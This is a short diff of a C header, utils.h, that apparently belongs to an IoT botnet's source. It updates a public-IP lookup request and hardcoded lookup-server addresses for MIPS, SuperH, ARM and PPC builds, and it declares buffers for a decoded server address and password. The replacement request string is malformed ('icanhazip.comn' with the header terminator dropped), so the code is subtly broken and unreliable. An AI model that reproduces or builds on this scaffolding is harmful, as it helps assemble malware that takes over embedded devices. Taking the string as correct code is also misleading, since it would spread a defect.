@@ -1,20 +1,20 @@
 #ifndef __UTILS_H_
 #define __UTILS_H_
 
-#define IPREQUEST "GET /n09230945.asp HTTP/1.0\nHost: automation.whatismyip.com\n\n"
+#define IPREQUEST "GET /index.html HTTP/1.0\nHost: icanhazip.comn\n"
 
 #ifdef MIPSEL
-	#define ipreq   "72.233.89.197"
+	#define ipreq   "64.182.208.183"
 #elif MIPS
-	#define ipreq   "72.233.89.197"
+	#define ipreq   "104.238.136.31"
 #elif SUPERH
-	#define ipreq   "72.233.89.198"
+	#define ipreq   "104.238.141.75"
 #elif ARM
-	#define ipreq   "72.233.89.199"
+	#define ipreq   "104.238.141.75"
 #elif PPC
-	#define ipreq   "72.233.89.200"
+	#define ipreq   "104.238.136.31"
 #else
-	#define ipreq   "72.233.89.197"
+	#define ipreq   "104.238.141.75"
 #endif
 
 char decodedsrv[512], decodedpsw[32];
